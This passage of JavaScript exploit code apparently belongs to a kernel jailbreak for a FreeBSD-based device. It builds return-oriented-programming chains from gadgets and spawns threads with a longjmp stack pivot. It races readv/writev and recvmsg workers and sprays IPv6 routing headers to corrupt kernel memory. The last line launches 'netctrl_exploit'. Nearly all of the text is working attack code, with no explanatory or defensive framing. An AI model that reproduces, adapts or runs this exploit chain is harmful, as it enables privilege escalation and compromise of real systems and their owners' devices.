    read(new BigInt(iov_sock_0), tmp, 1);
  }
  if (iov_count === 10000 && read32(iov_leak_add) !== UIO_SYSSPACE) {
    debug('kwriteslow - iov reclaim exhausted');
    for (var _kw = 0; _kw < UIO_THREAD_NUM; _kw++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }
    wait_uio_readv();
    return BigInt_Error;
  }
  for (var _i15 = 0; _i15 < UIO_THREAD_NUM; _i15++) {
    write(new BigInt(uio_sock_1), buffer, size);
  }
  wait_uio_readv();
  write(new BigInt(iov_sock_1), tmp, 1);
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  if (!refind_triplets_fast()) {
    debug('kwriteslow - Alias refind failed');
    return BigInt_Error;
  }
  return new BigInt(0);
}
function rop_regen_and_loop(last_rop_entry, number_entries) {
  var new_rop_entry = last_rop_entry.add(8);
  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add
  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add
  for (var i = 0; i < number_entries; i++) {
    var entry_add = copy_entry;
    var entry_val = read64(copy_entry);
    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_rop_entry.add(0x8), entry_add);
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_rop_entry.add(0x18), entry_val);
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
    copy_entry = copy_entry.add(8);
    new_rop_entry = new_rop_entry.add(0x28);
  }
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_rop_entry.add(0x8), rop_loop);
}
function spawn_thread(rop_array, loop_entries, predefinedStack) {
  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);
  for (var i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]);
  }
  if (loop_entries !== 0) {
    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
    rop_regen_and_loop(last_rop_entry, loop_entries);
  }
  var jmpbuf = malloc(0x60);
  write64(jmpbuf.add(0x00), gadgets.RET); // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_addr); // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl); // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr); // MXCSR
  var stack_size = new BigInt(0x100);
  var tls_size = new BigInt(0x40);
  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));
  write64(spawn_thr_args.add(0x00), longjmp_addr); // start_func = longjmp
  write64(spawn_thr_args.add(0x08), jmpbuf); // arg = jmpbuf
  write64(spawn_thr_args.add(0x10), stack); // stack_base
  write64(spawn_thr_args.add(0x18), stack_size); // stack_size
  write64(spawn_thr_args.add(0x20), tls); // tls_base
  write64(spawn_thr_args.add(0x28), tls_size); // tls_size
  write64(spawn_thr_args.add(0x30), spawn_tid); // child_tid (output)
  write64(spawn_thr_args.add(0x38), spawn_cpid); // parent_tid (output)
  var result = thr_new(spawn_thr_args, 0x68);
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(spawn_tid);
}
function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(iov_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(msg);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(0));
  rop.push(recvmsg_wrapper);
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovWrite);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(readv_wrapper);
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_1));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovRead);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(writev_wrapper);
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[i]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)); // Offset for socket i
    rop.push(gadgets.POP_R8_RET);
    rop.push(new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }
  for (var _i16 = 0; _i16 < ipv6_socks.length; _i16++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[_i16]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(read_rthdr_rop.add(_i16 * 8)); // Offset for socket i
    rop.push(gadgets.POP_R8_RET);
    rop.push(check_len);
    rop.push(getsockopt_wrapper);
  }
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(0));
  rop.push(thr_exit_wrapper);
  return {
    rop,
    loop_size: 0 // loop_size
  };
}
if(jsmaf.defer_netctrl_start){jsmaf.netctrl_exploit=netctrl_exploit;}else{netctrl_exploit();}
